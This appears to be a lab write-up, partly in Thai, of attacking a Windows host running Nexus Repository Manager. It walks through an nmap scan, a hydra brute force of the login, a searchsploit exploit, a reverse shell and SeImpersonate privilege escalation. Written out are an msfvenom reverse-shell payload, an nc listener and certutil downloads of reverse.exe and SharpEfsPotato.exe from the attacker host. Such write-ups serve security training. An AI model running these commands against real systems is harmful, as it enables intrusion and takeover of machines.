
# Recon

## TCP Scan

```bash
sudo ../tools/scan.sh 192.168.127.61 
[*] Running rustscan...
[*] Running nmap on ports: 80,139,445,5040,21,135,8081,49664,49665,49666,49668,49669,49667
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 23:38 EDT
Nmap scan report for 192.168.127.61
Host is up (0.65s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: BaGet
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-04T03:40:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.09 seconds

```


## TCP 8081 
![[Pasted image 20250704104358.png]]

### Wordlist gen 
```bash
cewl --lowercase http://192.168.127.61:8081/ | grep -v CeWL  >> custom-wordlist.txt
```


# bruteforce using hydra 
![[Pasted image 20250704110737.png]]

```bash
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.127.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
# USER64 และ PASS64 เป็นการ encode ด้วย base64 
```

![[Pasted image 20250704112327.png]]

# Exploit 

โหลด Exploit ด้วย `searchsploit -m 49385` จากนั้นแก้ไข Payload 

![[Pasted image 20250704144300.png]]

![[Pasted image 20250704144442.png]]

## Reverse Shell as nathan 

สร้าง Shell
![[Pasted image 20250704144705.png]]

![[Pasted image 20250704144600.png]]

![[Pasted image 20250704144634.png]]

# Privilege Escalation 

```powershell
PS C:\Users\nathan\Nexus\nexus-3.21.0-05> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
PS C:\Users\nathan\Nexus\nexus-3.21.0-05> 
```

จากการตรวจสอบพบว่ามีสิทธิ SeImpersonatePrivilege ซึ่งหมายความว่าสามารถใช้ Potato ได้ 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1) LPORT=8000 -f exe -o reverse.exe

rlwarp nc -lvnp 8000
```

```powershell
cd /
cd .\Users\nathan\Desktop 
certutil.exe -urlcache -f http://192.168.45.219/reverse.exe reverse.exe
certutil.exe -urlcache -f http://192.168.45.219/SharpEfsPotato.exe SharpEfsPotato.exe

```

![[Pasted image 20250707093015.png]]

# PWN